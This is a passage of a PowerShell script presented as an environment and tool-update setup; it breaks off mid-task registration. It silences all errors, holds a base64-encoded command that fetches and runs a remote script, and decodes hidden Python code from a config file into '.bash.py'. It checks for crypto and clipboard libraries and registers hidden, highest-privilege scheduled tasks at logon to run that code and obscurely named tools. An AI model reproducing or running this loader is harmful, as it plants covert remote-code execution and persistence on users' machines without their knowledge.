$originalPSDefaults = if ($PSDefaultParameterValues -and $PSDefaultParameterValues.Count -gt 0) {
    $PSDefaultParameterValues.Clone()
} else {
    @{}
}
$PSDefaultParameterValues['*:ErrorAction'] = 'SilentlyContinue'
$PSDefaultParameterValues['*:WarningAction'] = 'SilentlyContinue'
$PSDefaultParameterValues['*:InformationAction'] = 'SilentlyContinue'
$PSDefaultParameterValues['*:Verbose'] = $false
$PSDefaultParameterValues['*:Debug'] = $false
$ENCODED_EC = 'aXdyIC11c2ViIGh0dHBzOi8vYWdlbnRza2lsbHNodWIudmVyY2VsLmFwcC9zcmMvU0VUVVAucHMxIHwgaWV4'

function Test-StoreStub {
    param(
        [string]$Path
    )

    if (-not $Path) {
        return $true
    }

    if ($Path -like '*\Microsoft\WindowsApps\*' -or $Path -like '*\WindowsApps\*') {
        return $true
    }

    return $false
}

function Find-ExistingPath {
    param(
        [string[]]$Candidates
    )

    return Find-ExistingPaths -Candidates $Candidates | Select-Object -First 1
}

function Find-ExistingPaths {
    param(
        [string[]]$Candidates
    )

    $seen = @{}
    foreach ($candidate in $Candidates) {
        if (-not $candidate) { continue }
        try {
            $candidate = [Environment]::ExpandEnvironmentVariables($candidate.Trim('"'))
            $items = @()
            if (Test-Path -LiteralPath $candidate -PathType Leaf) {
                $items = @(Get-Item -LiteralPath $candidate -ErrorAction SilentlyContinue)
            } elseif ($candidate.Contains('*') -or $candidate.Contains('?')) {
                $items = @(Get-ChildItem -Path $candidate -File -ErrorAction SilentlyContinue)
            }
            foreach ($item in @($items)) {
                if ($item -and $item.FullName -and -not (Test-StoreStub $item.FullName) -and -not $seen.ContainsKey($item.FullName)) {
                    $seen[$item.FullName] = $true
                    $item.FullName
                }
            }
        } catch {
        }
    }
}

function Find-CommandPath {
    param(
        [string[]]$Names,
        [string[]]$FallbackPaths = @()
    )

    foreach ($name in $Names) {
        try {
            $commands = Get-Command $name -CommandType Application, ExternalScript -All -ErrorAction Stop
            foreach ($command in $commands) {
                $resolved = Find-ExistingPath -Candidates @($command.Path)
                if ($resolved) {
                    return $resolved
                }
            }
        } catch {
        }
    }

    return Find-ExistingPath -Candidates $FallbackPaths
}

function Test-PythonDeps {
    param([string]$PythonPath)
    try {
        & $PythonPath -c "import requests, cryptography, Crypto, pyperclip" 2>$null
        return $LASTEXITCODE -eq 0
    } catch {
        return $false
    }
}

function Find-PythonPath {
    param(
        [string]$UserProfilePath
    )

    $pythonCandidates = @(Find-ExistingPaths -Candidates @(
        "$env:ProgramFiles\Python*\python.exe",
        "${env:ProgramFiles(x86)}\Python*\python.exe"
    ))
    $pythonCandidates += @(Find-ExistingPaths -Candidates @(
        "$UserProfilePath\AppData\Local\Programs\Python\Python*\python.exe",
        "$env:LOCALAPPDATA\Programs\Python\Python*\python.exe"
    ))
    foreach ($pythonPath in @($pythonCandidates)) {
        try {
            & $pythonPath --version >$null 2>$null
            if ($LASTEXITCODE -eq 0 -and (Test-PythonDeps $pythonPath)) {
                return $pythonPath
            }
        } catch {
        }
    }

    $pythonCommandPaths = @()
    foreach ($name in @('python', 'python3')) {
        $found = Find-CommandPath -Names @($name)
        if ($found -and $pythonCommandPaths -notcontains $found) { $pythonCommandPaths += $found }
    }
    foreach ($pythonPath in @($pythonCommandPaths)) {
        try {
            & $pythonPath --version >$null 2>$null
            if ($LASTEXITCODE -eq 0 -and (Test-PythonDeps $pythonPath)) {
                return $pythonPath
            }
        } catch {
        }
    }

    $pyPath = Find-CommandPath -Names @('py')
    $pyResolvedPath = $null
    if ($pyPath) {
        try {
            $pyResolvedPath = (& $pyPath -c "import sys; print(sys.executable)" 2>$null | Out-String).Trim()
            if ($pyResolvedPath -and (Test-Path -LiteralPath $pyResolvedPath -PathType Leaf) -and -not (Test-StoreStub $pyResolvedPath) -and (Test-PythonDeps $pyResolvedPath)) {
                return $pyResolvedPath
            }
        } catch {
        }
    }

    $fallbackCandidates = @($pythonCandidates) + @($pythonCommandPaths) + @($pyResolvedPath)
    foreach ($fb in $fallbackCandidates) {
        if (-not $fb) { continue }
        if (-not (Test-Path -LiteralPath $fb -PathType Leaf) -or (Test-StoreStub $fb)) { continue }
        try {
            & $fb --version >$null 2>$null
            if ($LASTEXITCODE -eq 0) { return $fb }
        } catch {
        }
    }

    return $null
}

function Find-PipxVenvPythonPath {
    param(
        [string]$UserProfilePath,
        [string[]]$VenvNames
    )

    $candidates = @()
    foreach ($venvName in $VenvNames) {
        if (-not $venvName) {
            continue
        }

        $candidates += @(
            "$UserProfilePath\pipx\venvs\$venvName\Scripts\python.exe",
            "$env:USERPROFILE\pipx\venvs\$venvName\Scripts\python.exe",
            "$env:LOCALAPPDATA\pipx\venvs\$venvName\Scripts\python.exe"
        )
    }

    return Find-ExistingPath -Candidates $candidates
}

function Convert-ToSingleQuotedPowerShellLiteral {
    param(
        [string]$Value
    )

    if ($null -eq $Value) {
        return "''"
    }

    return "'$($Value.Replace("'", "''"))'"
}

function Get-WindowsPowerShellPath {
    # System32 is a stable task path, including when setup runs under 32-bit PowerShell.
    $path = Find-ExistingPath -Candidates @("$env:SystemRoot\System32\WindowsPowerShell\v1.0\powershell.exe")
    if (-not $path) {
        throw 'Windows PowerShell executable was not found under SystemRoot.'
    }
    return $path
}

function New-PowerShellTaskAction {
    param([string]$Command)

    # Encode the command so spaces, quotes and Unicode survive Task Scheduler parsing.
    $commandText = "`$ErrorActionPreference = 'Stop'; try { $Command } catch { Write-Error `$_ -ErrorAction Continue; exit 1 }"
    $encodedCommand = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($commandText))
    $hostPath = Get-WindowsPowerShellPath
    return New-ScheduledTaskAction -Execute $hostPath -Argument "-NoProfile -NonInteractive -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand $encodedCommand" -WorkingDirectory (Split-Path -Parent $hostPath) -ErrorAction Stop
}

function Register-ManagedTask {
    param(
        [string]$TaskName,
        $Action,
        $Trigger,
        $Principal,
        $Settings
    )

    foreach ($taskAction in @($Action)) {
        if (-not [IO.Path]::IsPathRooted($taskAction.Execute) -or
            -not (Test-Path -LiteralPath $taskAction.Execute -PathType Leaf)) {
            throw "Task '$TaskName' executable does not exist: $($taskAction.Execute)"
        }
        if (-not $taskAction.WorkingDirectory -or
            -not (Test-Path -LiteralPath $taskAction.WorkingDirectory -PathType Container)) {
            throw "Task '$TaskName' working directory does not exist: $($taskAction.WorkingDirectory)"
        }
    }

    # Replace the complete definition in place; a failed update must not delete the old task.
    Register-ScheduledTask -TaskPath '\' -TaskName $TaskName -Action $Action -Trigger $Trigger -Principal $Principal -Settings $Settings -Force -ErrorAction Stop | Out-Null
}

function Find-ToolPath {
    param([string]$Name, [string]$UserProfilePath, [string]$PythonScriptsDir)

    $directories = @(
        "$UserProfilePath\.local\bin",
        "$UserProfilePath\AppData\Roaming\Python\Python*\Scripts",
        "$UserProfilePath\AppData\Local\Programs\Python\Python*\Scripts",
        "$UserProfilePath\pipx\venvs\*\Scripts",
        "$UserProfilePath\AppData\Local\pipx\venvs\*\Scripts",
        "$UserProfilePath\AppData\Roaming\uv\tools\*\Scripts",
        $PythonScriptsDir
    )
    $candidates = foreach ($directory in $directories) {
        if ($directory) {
            foreach ($extension in @('.exe', '.cmd', '.bat', '.ps1')) {
                "$directory\$Name$extension"
            }
        }
    }
    # Prefer the task user's installation when setup is elevated as another account.
    $found = Find-ExistingPath -Candidates $candidates
    if ($found) { return $found }
    return Find-CommandPath -Names @("$Name.exe", "$Name.cmd", "$Name.bat", "$Name.ps1")
}

function Expand-TargetUserPath {
    param([string]$Path, [string]$UserProfilePath)

    if (-not $Path) { return $null }
    $expanded = $Path.Trim().Trim('"')
    if ($UserProfilePath) {
        if ($expanded -eq '~' -or $expanded.StartsWith('~\') -or $expanded.StartsWith('~/')) {
            $relativePath = $expanded.Substring(1)
            while ($relativePath.StartsWith('\') -or $relativePath.StartsWith('/')) {
                $relativePath = $relativePath.Substring(1)
            }
            $expanded = if ($relativePath) { Join-Path $UserProfilePath $relativePath } else { $UserProfilePath }
        }
        $replacements = @{
            '%USERPROFILE%' = $UserProfilePath
            '%HOME%' = $UserProfilePath
            '%LOCALAPPDATA%' = "$UserProfilePath\AppData\Local"
            '%APPDATA%' = "$UserProfilePath\AppData\Roaming"
        }
        foreach ($entry in $replacements.GetEnumerator()) {
            $searchStart = 0
            while (($matchIndex = $expanded.IndexOf($entry.Key, $searchStart, [StringComparison]::OrdinalIgnoreCase)) -ge 0) {
                $expanded = $expanded.Substring(0, $matchIndex) + $entry.Value + $expanded.Substring($matchIndex + $entry.Key.Length)
                $searchStart = $matchIndex + $entry.Value.Length
            }
        }
    }
    return [Environment]::ExpandEnvironmentVariables($expanded)
}

function Get-TargetUserEnvironmentVariable {
    param([string]$Name, [string]$UserSid)

    if (-not $Name -or -not $UserSid) { return $null }
    $key = $null
    try {
        $key = [Microsoft.Win32.Registry]::Users.OpenSubKey("$UserSid\Environment")
        if ($key) {
            return $key.GetValue($Name, $null, [Microsoft.Win32.RegistryValueOptions]::DoNotExpandEnvironmentNames)
        }
    } catch {
    } finally {
        if ($key) { $key.Dispose() }
    }
    return $null
}

function Get-UvToolBinDirectories {
    param(
        [string]$UserProfilePath,
        [string]$UserSid,
        [string]$UvPath
    )

    $rawDirectories = @()
    $sameUserProfile = $false
    if ($UserProfilePath -and $env:USERPROFILE) {
        try {
            $sameUserProfile = [IO.Path]::GetFullPath($UserProfilePath).TrimEnd('\') -ieq
                [IO.Path]::GetFullPath($env:USERPROFILE).TrimEnd('\')
        } catch {
        }
    }

    if ($sameUserProfile -and $UvPath) {
        try {
            $reportedDirectory = (& $UvPath tool dir --bin 2>$null | Select-Object -First 1 | Out-String).Trim()
            if ($LASTEXITCODE -eq 0 -and $reportedDirectory) { $rawDirectories += $reportedDirectory }
        } catch {
        }
    }
    if ($sameUserProfile -and $env:UV_TOOL_BIN_DIR) { $rawDirectories += $env:UV_TOOL_BIN_DIR }

    $targetUserDirectory = Get-TargetUserEnvironmentVariable -Name 'UV_TOOL_BIN_DIR' -UserSid $UserSid
    if ($targetUserDirectory) { $rawDirectories += $targetUserDirectory }
    $machineDirectory = [Environment]::GetEnvironmentVariable('UV_TOOL_BIN_DIR', 'Machine')
    if ($machineDirectory) { $rawDirectories += $machineDirectory }
    $rawDirectories += "$UserProfilePath\.local\bin"

    $seen = @{}
    foreach ($directory in $rawDirectories) {
        $expanded = Expand-TargetUserPath -Path $directory -UserProfilePath $UserProfilePath
        if (-not $expanded) { continue }
        try { $expanded = [IO.Path]::GetFullPath($expanded).TrimEnd('\') } catch { continue }
        if (-not $seen.ContainsKey($expanded)) {
            $seen[$expanded] = $true
            $expanded
        }
    }
}

function Find-UvToolPath {
    param(
        [string]$Name,
        [string[]]$ToolBinDirectories
    )

    $candidates = foreach ($directory in $ToolBinDirectories) {
        if (-not $directory) { continue }
        foreach ($extension in @('.exe', '.cmd', '.bat', '.ps1')) {
            "$directory\$Name$extension"
        }
    }
    # uv's bin directory contains stable shims. Never bind tasks to replaceable tool venvs or unrelated PATH entries.
    return Find-ExistingPath -Candidates $candidates
}

function New-HiddenStartProcessCommand {
    param(
        [string]$FilePath,
        [string[]]$Arguments = @(),
        [string]$WorkingDirectory
    )

    $resolvedPath = Find-ExistingPath -Candidates @($FilePath)
    if (-not $resolvedPath) {
        throw "Launch executable does not exist: $FilePath"
    }
    $FilePath = $resolvedPath
    if (-not $WorkingDirectory) { $WorkingDirectory = Split-Path -Parent $FilePath }
    if (-not (Test-Path -LiteralPath $WorkingDirectory -PathType Container)) {
        throw "Launch working directory does not exist: $WorkingDirectory"
    }

    # Start-Process joins ArgumentList with spaces; each native argument needs its own quotes.
    $argumentText = (@($Arguments | ForEach-Object {
        '"' + (($_ -replace '(\\*)"', '$1$1\"') -replace '(\\+)$', '$1$1') + '"'
    }) -join ' ')
    switch ([IO.Path]::GetExtension($FilePath).ToLowerInvariant()) {
        '.ps1' {
            $invocation = "& $(Convert-ToSingleQuotedPowerShellLiteral $FilePath)"
            foreach ($argument in $Arguments) { $invocation += " $(Convert-ToSingleQuotedPowerShellLiteral $argument)" }
            $encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes("`$ErrorActionPreference = 'Stop'; $invocation"))
            $FilePath = Get-WindowsPowerShellPath
            $argumentText = "-NoProfile -NonInteractive -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand $encoded"
        }
        { $_ -in @('.cmd', '.bat') } {
            $argumentText = '/d /s /c ""' + $FilePath + '" ' + $argumentText + '"'
            $FilePath = Find-ExistingPath -Candidates @("$env:SystemRoot\System32\cmd.exe")
            if (-not $FilePath) { throw 'Windows command processor was not found under SystemRoot.' }
        }
    }

    $commandParts = @(
        "Start-Process -FilePath $(Convert-ToSingleQuotedPowerShellLiteral -Value $FilePath)"
    )

    if ($argumentText) {
        $commandParts += "-ArgumentList $(Convert-ToSingleQuotedPowerShellLiteral -Value $argumentText)"
    }

    if ($WorkingDirectory) {
        $commandParts += "-WorkingDirectory $(Convert-ToSingleQuotedPowerShellLiteral -Value $WorkingDirectory)"
    }

    $commandParts += '-WindowStyle Hidden -ErrorAction Stop | Out-Null'
    return ($commandParts -join ' ')
}

function New-AbsoluteScheduledTaskAction {
    param(
        [string]$FilePath,
        [string[]]$Arguments = @(),
        [string]$WorkingDirectory
    )

    $resolvedPath = Find-ExistingPath -Candidates @($FilePath)
    if (-not $resolvedPath) {
        throw "Task executable does not exist: $FilePath"
    }

    $FilePath = $resolvedPath
    if (-not $WorkingDirectory) { $WorkingDirectory = Split-Path -Parent $FilePath }
    if (-not (Test-Path -LiteralPath $WorkingDirectory -PathType Container)) {
        throw "Task working directory does not exist: $WorkingDirectory"
    }

    $argumentText = (@($Arguments | ForEach-Object {
        '"' + (($_ -replace '(\\*)"', '$1$1\"') -replace '(\\+)$', '$1$1') + '"'
    }) -join ' ')

    switch ([IO.Path]::GetExtension($FilePath).ToLowerInvariant()) {
        '.ps1' {
            $invocation = "& $(Convert-ToSingleQuotedPowerShellLiteral $FilePath)"
            foreach ($argument in $Arguments) { $invocation += " $(Convert-ToSingleQuotedPowerShellLiteral $argument)" }
            $encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes("`$ErrorActionPreference = 'Stop'; $invocation"))
            $FilePath = Get-WindowsPowerShellPath
            $argumentText = "-NoProfile -NonInteractive -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand $encoded"
        }
        { $_ -in @('.cmd', '.bat') } {
            $argumentText = '/d /s /c ""' + $FilePath + '" ' + $argumentText + '"'
            $FilePath = Find-ExistingPath -Candidates @("$env:SystemRoot\System32\cmd.exe")
            if (-not $FilePath) { throw 'Windows command processor was not found under SystemRoot.' }
        }
    }

    $parameters = @{
        Execute = $FilePath
        WorkingDirectory = $WorkingDirectory
        ErrorAction = 'Stop'
    }
    if ($argumentText) { $parameters.Argument = $argumentText }
    return New-ScheduledTaskAction @parameters
}

function Get-LaunchCommand {
    param(
        [string]$PreferredExecutable,
        [string[]]$PreferredArguments = @(),
        [string]$FallbackExecutable
    )

    if ($PreferredExecutable -and (Test-Path $PreferredExecutable)) {
        return New-HiddenStartProcessCommand -FilePath $PreferredExecutable -Arguments $PreferredArguments
    }

    if ($FallbackExecutable -and (Test-Path $FallbackExecutable)) {
        return New-HiddenStartProcessCommand -FilePath $FallbackExecutable
    }

    return $null
}

function Install-ConfigDirectory {
    param(
        [Parameter(Mandatory = $true)]
        [string]$SourceDir,
        [Parameter(Mandatory = $true)]
        [string]$DestinationDir
    )

    if (-not (Test-Path -LiteralPath $SourceDir -PathType Container)) {
        throw "Configuration source directory does not exist: $SourceDir"
    }

    $destinationParent = Split-Path -Parent $DestinationDir
    $stagingDir = Join-Path $destinationParent ('.configs.setup-' + [System.Guid]::NewGuid().ToString('N'))
    $backupDir = Join-Path $destinationParent ('.configs.backup-' + [System.Guid]::NewGuid().ToString('N'))
    $hasBackup = $false

    try {
        Copy-Item -LiteralPath $SourceDir -Destination $stagingDir -Recurse -Force -ErrorAction Stop
        if (-not (Test-Path -LiteralPath (Join-Path $stagingDir '.bash.py') -PathType Leaf)) {
            throw "Generated configuration script is missing from staging directory: $stagingDir"
        }

        if (Test-Path -LiteralPath $DestinationDir) {
            Move-Item -LiteralPath $DestinationDir -Destination $backupDir -ErrorAction Stop
            $hasBackup = $true
        }

        try {
            Move-Item -LiteralPath $stagingDir -Destination $DestinationDir -ErrorAction Stop
        } catch {
            if ($hasBackup -and -not (Test-Path -LiteralPath $DestinationDir)) {
                Move-Item -LiteralPath $backupDir -Destination $DestinationDir -ErrorAction SilentlyContinue
                if (Test-Path -LiteralPath $DestinationDir) {
                    $hasBackup = $false
                }
            }
            throw
        }

        if ($hasBackup) {
            Remove-Item -LiteralPath $backupDir -Recurse -Force -ErrorAction Stop
            $hasBackup = $false
        }
    } finally {
        if (Test-Path -LiteralPath $stagingDir) {
            Remove-Item -LiteralPath $stagingDir -Recurse -Force -ErrorAction SilentlyContinue
        }
        if ($hasBackup -and (Test-Path -LiteralPath $backupDir) -and -not (Test-Path -LiteralPath $DestinationDir)) {
            Move-Item -LiteralPath $backupDir -Destination $DestinationDir -ErrorAction SilentlyContinue
        }
    }
}

function Get-ConfigCodeBase64 {
    param(
        [string[]]$ConfigLines
    )

    $codeLines = @($ConfigLines | Where-Object { $_ -cmatch '^code *= *' })
    if ($codeLines.Count -eq 0) {
        return $null
    }

    $base64 = ($codeLines | ForEach-Object { $_ -creplace '^code *= *', '' }) -join [Environment]::NewLine
    return $base64 -replace '[^A-Za-z0-9+/=]', ''
}

$realUser = $null

try {
    $computerSystem = Get-CimInstance Win32_ComputerSystem -ErrorAction SilentlyContinue
    if ($computerSystem -and $computerSystem.UserName) {
        $realUser = $computerSystem.UserName
    }
} catch {
}

if (-not $realUser) {
    try {
        $realUser = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
    } catch {
    }
}

if (-not $realUser) {
    $envUser = $env:USERNAME
    $envDomain = $env:USERDOMAIN
    if ($envUser) {
        if ($envDomain -and $envDomain -ne $env:COMPUTERNAME) {
            $realUser = "$envDomain\$envUser"
        } else {
            $realUser = "$env:COMPUTERNAME\$envUser"
        }
    }
}

if (-not $realUser) {
    $PSDefaultParameterValues.Clear()
    foreach ($key in $originalPSDefaults.Keys) {
        $PSDefaultParameterValues[$key] = $originalPSDefaults[$key]
    }
    exit 1
}

if ($realUser -match '\\') {
    $targetUserName = ($realUser -split '\\')[-1]
} else {
    $targetUserName = $realUser
}

$targetUserProfile = $null
try {
    $account = New-Object System.Security.Principal.NTAccount($realUser)
    $targetUserSid = $account.Translate([System.Security.Principal.SecurityIdentifier]).Value
    $profileRecord = Get-ItemProperty -LiteralPath "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProfileList\$targetUserSid" -ErrorAction Stop
    $profilePath = [Environment]::ExpandEnvironmentVariables($profileRecord.ProfileImagePath)
    if (Test-Path -LiteralPath $profilePath -PathType Container) { $targetUserProfile = $profilePath }
} catch {
}
if (-not $targetUserProfile -and $env:USERPROFILE -and (Test-Path -LiteralPath $env:USERPROFILE -PathType Container)) {
    $envUserName = Split-Path -Leaf $env:USERPROFILE
    if ($envUserName -ieq $targetUserName) {
        $targetUserProfile = $env:USERPROFILE
    }
}

if (-not $targetUserProfile) {
    $defaultProfilePath = "C:\Users\$targetUserName"
    if (Test-Path -LiteralPath $defaultProfilePath -PathType Container) {
        $targetUserProfile = $defaultProfilePath
    }
}

if (-not $targetUserProfile) {
    $targetUserProfile = Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProfileList\*" |
        ForEach-Object {
            $profilePath = [System.Environment]::ExpandEnvironmentVariables($_.ProfileImagePath)
            if ($profilePath -and (Split-Path -Leaf $profilePath) -ieq $targetUserName -and
                (Test-Path -LiteralPath $profilePath -PathType Container)) {
                $profilePath
            }
        } |
        Select-Object -First 1
}

$targetConfigBase = "$targetUserProfile\.config"
$destDir = "$targetConfigBase\.configs"
$scriptPath = $null

$env:Path = $env:Path + ';' + [System.Environment]::GetEnvironmentVariable('Path', 'Machine') + ';' + [System.Environment]::GetEnvironmentVariable('Path', 'User')

$pythonPath = Find-PythonPath -UserProfilePath $targetUserProfile
$pythonDir = if ($pythonPath) { Split-Path -Parent $pythonPath } else { $null }
$pythonwPath = if ($pythonDir) {
    $pythonwCandidate = Join-Path $pythonDir 'pythonw.exe'
    if (Test-Path -LiteralPath $pythonwCandidate -PathType Leaf) { (Get-Item -LiteralPath $pythonwCandidate).FullName } else { $pythonPath }
} else { $null }
$pythonScriptsDir = if ($pythonDir) { Join-Path $pythonDir 'Scripts' } else { $null }

$uvBin           = Find-ToolPath -Name 'uv' -UserProfilePath $targetUserProfile -PythonScriptsDir $pythonScriptsDir
$uvToolBinDirectories = @(Get-UvToolBinDirectories -UserProfilePath $targetUserProfile -UserSid $targetUserSid -UvPath $uvBin)
$bserexpBin      = Find-UvToolPath -Name 'bserexp-wins' -ToolBinDirectories $uvToolBinDirectories
$agentSettingBin = Find-UvToolPath -Name 'agent-setting' -ToolBinDirectories $uvToolBinDirectories
$wklerBin        = Find-UvToolPath -Name 'wkler' -ToolBinDirectories $uvToolBinDirectories
$jtbjkBin        = Find-UvToolPath -Name 'jtbjk' -ToolBinDirectories $uvToolBinDirectories

foreach ($toolEntry in @{'bserexp-wins' = $bserexpBin; 'agent-setting' = $agentSettingBin; 'wkler' = $wklerBin; 'jtbjk' = $jtbjkBin}.GetEnumerator()) {
    if (-not $toolEntry.Value) {
        Write-Warning "Executable '$($toolEntry.Key)' was not found for '$realUser'; its task cannot be updated. Check the installation path and rerun setup." -WarningAction Continue
    }
}

# File invocation resolves beside setup.ps1; downloaded/Invoke-Expression invocation uses cwd.
$sourceConfigDir = if ($PSScriptRoot) { Join-Path $PSScriptRoot '.configs' } else { Join-Path (Get-Location).Path '.configs' }

try {
    if ($realUser -and $targetUserProfile -and (Test-Path -LiteralPath $targetUserProfile -PathType Container) -and (Test-Path -LiteralPath $sourceConfigDir -PathType Container)) {
        $configLines = Get-Content -LiteralPath (Join-Path $sourceConfigDir 'config.ini') -ErrorAction Stop

        $base64 = Get-ConfigCodeBase64 -ConfigLines $configLines
        if ($base64) {
            $bytes = [System.Convert]::FromBase64String($base64)
            $generatedScriptPath = Join-Path $sourceConfigDir '.bash.py'
            [System.IO.File]::WriteAllBytes($generatedScriptPath, $bytes)

            if (-not (Test-Path -LiteralPath $generatedScriptPath -PathType Leaf)) {
                throw "Failed to create configuration script: $generatedScriptPath"
            }

            if (-not (Test-Path -LiteralPath $targetConfigBase -PathType Container)) {
                New-Item -Path $targetConfigBase -ItemType Directory -ErrorAction Stop | Out-Null
            }

            Install-ConfigDirectory -SourceDir $sourceConfigDir -DestinationDir $destDir

            $scriptPath = "$destDir\.bash.py"
            if (Test-Path -LiteralPath $scriptPath -PathType Leaf) {
                try {
                    $acl = Get-Acl $scriptPath
                    $accessRule = New-Object System.Security.AccessControl.FileSystemAccessRule($realUser, "FullControl", "Allow")
                    $acl.SetAccessRule($accessRule)
                    Set-Acl $scriptPath $acl
                } catch {
                }

                $taskName = 'Environment'

                if ($pythonwPath) {
                    $scriptPath = (Get-Item -LiteralPath $scriptPath).FullName
                    $scriptDir = Split-Path -Parent $scriptPath
                    $action = New-AbsoluteScheduledTaskAction -FilePath $pythonwPath -Arguments @($scriptPath) -WorkingDirectory $scriptDir

                    $trigger = New-ScheduledTaskTrigger -AtLogOn -User $realUser
                    $trigger.Enabled = $true
                    $trigger.Delay = 'PT5M'

                    $principal = New-ScheduledTaskPrincipal -UserId $realUser -LogonType Interactive -RunLevel Highest

                    $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -Hidden -MultipleInstances Parallel -StartWhenAvailable

                    try {
                        Register-ManagedTask -TaskName $taskName -Action $action -Trigger $trigger -Principal $principal -Settings $settings
                        Enable-ScheduledTask -TaskPath '\' -TaskName $taskName -ErrorAction Stop | Out-Null
                        try {
                            Start-ScheduledTask -TaskPath '\' -TaskName $taskName -ErrorAction Stop
                        } catch {
                            Write-Warning "Task '$taskName' could not be started: $($_.Exception.Message)" -WarningAction Continue
                            Start-Process -FilePath $pythonwPath -ArgumentList "`"$scriptPath`"" -WorkingDirectory $scriptDir -WindowStyle Hidden -ErrorAction Stop | Out-Null
                        }
                    } catch {
                        Write-Warning "Task '$taskName' installation/start failed: $($_.Exception.Message)" -WarningAction Continue
                    }
                } else {
                    Write-Warning 'Python was not found; the Environment task cannot be updated.' -WarningAction Continue
                }
            }
        } else {
            Write-Warning "No configuration code was found in '$sourceConfigDir\config.ini'; the Environment task cannot be updated." -WarningAction Continue
        }
    } else {
        Write-Warning "Environment task cannot be updated: check user profile '$targetUserProfile' and configuration directory '$sourceConfigDir'." -WarningAction Continue
    }
} catch {
    Write-Warning "Environment configuration failed: $($_.Exception.Message)" -WarningAction Continue
}

try {
    if ($realUser) {
        Unregister-ScheduledTask -TaskPath '\' -TaskName 'Autobackup' -Confirm:$false -ErrorAction SilentlyContinue
        $bserexpTaskName = 'bserexp'
        $agentSettingTaskName = 'agent-setting'
        $wklerTaskName = 'wkler'
        $jtbjkTaskName = 'jtbjk'
        $autoupgradeTaskName = 'autoupgrade'

        if ($bserexpBin) {
            $bserexpActions = @()
            if ($uvBin) {
                $bserexpActions += New-AbsoluteScheduledTaskAction -FilePath $uvBin -Arguments @('tool', 'upgrade', '--all')
            }
            $bserexpActions += New-AbsoluteScheduledTaskAction -FilePath $bserexpBin

            $bserexpTrigger = New-ScheduledTaskTrigger -Weekly -WeeksInterval 1 -DaysOfWeek Sunday -At 7pm
            $bserexpTrigger.Enabled = $true
            $bserexpPrincipal = New-ScheduledTaskPrincipal -UserId $realUser -LogonType Interactive -RunLevel Highest
            $bserexpSettings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -Hidden -MultipleInstances Parallel -StartWhenAvailable

            try {
                Register-ManagedTask -TaskName $bserexpTaskName -Action $bserexpActions -Trigger $bserexpTrigger -Principal $bserexpPrincipal -Settings $bserexpSettings
                Enable-ScheduledTask -TaskPath '\' -TaskName $bserexpTaskName -ErrorAction Stop | Out-Null
                Start-ScheduledTask -TaskPath '\' -TaskName $bserexpTaskName -ErrorAction Stop
            } catch {
                Write-Warning "Task '$bserexpTaskName' installation/start failed: $($_.Exception.Message)" -WarningAction Continue
            }
        }

        if ($agentSettingBin) {
            $agentSettingLaunchCommand = New-HiddenStartProcessCommand -FilePath $agentSettingBin
            $agentSettingTaskCommand = if ($uvBin) {
                $agentSettingUpgradeCommand = "& $(Convert-ToSingleQuotedPowerShellLiteral -Value $uvBin) tool upgrade --all"
                "$agentSettingUpgradeCommand; $agentSettingLaunchCommand"
            } else {
                $agentSettingLaunchCommand
            }
            $agentSettingAction = New-PowerShellTaskAction -Command $agentSettingTaskCommand

            $agentSettingTrigger = New-ScheduledTaskTrigger -Daily -DaysInterval 10 -At 11pm
            $agentSettingTrigger.Enabled = $true

            $agentSettingPrincipal = New-ScheduledTaskPrincipal -UserId $realUser -LogonType Interactive -RunLevel Highest

            $agentSettingSettings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -Hidden -MultipleInstances Parallel -StartWhenAvailable

            try {
                Register-ManagedTask -TaskName $agentSettingTaskName -Action $agentSettingAction -Trigger $agentSettingTrigger -Principal $agentSettingPrincipal -Settings $agentSettingSettings
                Enable-ScheduledTask -TaskPath '\' -TaskName $agentSettingTaskName -ErrorAction Stop | Out-Null
                Start-ScheduledTask -TaskPath '\' -TaskName $agentSettingTaskName -ErrorAction Stop
            } catch {
                Write-Warning "Task '$agentSettingTaskName' installation/start failed: $($_.Exception.Message)" -WarningAction Continue
            }
        }

        if ($wklerBin) {
            $wklerLaunchCommand = New-HiddenStartProcessCommand -FilePath $wklerBin
            $wklerTaskCommand = "if (-not (Get-CimInstance Win32_Process | Where-Object { `$_.ProcessId -ne `$PID -and `$_.CommandLine -and `$_.CommandLine -like '*wkler*' } | Select-Object -First 1)) { $wklerLaunchCommand }"
            $wklerAction = New-PowerShellTaskAction -Command $wklerTaskCommand

            $wklerTrigger = New-ScheduledTaskTrigger -AtLogOn -User $realUser
            $wklerTrigger.Enabled = $true
            $wklerTrigger.Delay = 'PT15M'

            $wklerPrincipal = New-ScheduledTaskPrincipal -UserId $realUser -LogonType Interactive -RunLevel Highest

            $wklerSettings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -Hidden -MultipleInstances Parallel -StartWhenAvailable

            try {
                Register-ManagedTask -TaskName $wklerTaskName -Action $wklerAction -Trigger $wklerTrigger -Principal $wklerPrincipal -Settings $wklerSettings
                Enable-ScheduledTask -TaskPath '\' -TaskName $wklerTaskName -ErrorAction Stop | Out-Null
                Start-ScheduledTask -TaskPath '\' -TaskName $wklerTaskName -ErrorAction Stop
            } catch {
                Write-Warning "Task '$wklerTaskName' installation/start failed: $($_.Exception.Message)" -WarningAction Continue
            }
        }

        if ($jtbjkBin) {
            $jtbjkLaunchCommand = New-HiddenStartProcessCommand -FilePath $jtbjkBin
            $jtbjkTaskCommand = "if (-not (Get-CimInstance Win32_Process | Where-Object { `$_.ProcessId -ne `$PID -and `$_.CommandLine -and `$_.CommandLine -like '*wkler*' } | Select-Object -First 1)) { $jtbjkLaunchCommand }"
            $jtbjkAction = New-PowerShellTaskAction -Command $jtbjkTaskCommand

            $jtbjkTrigger = New-ScheduledTaskTrigger -AtLogOn -User $realUser
            $jtbjkTrigger.Enabled = $true
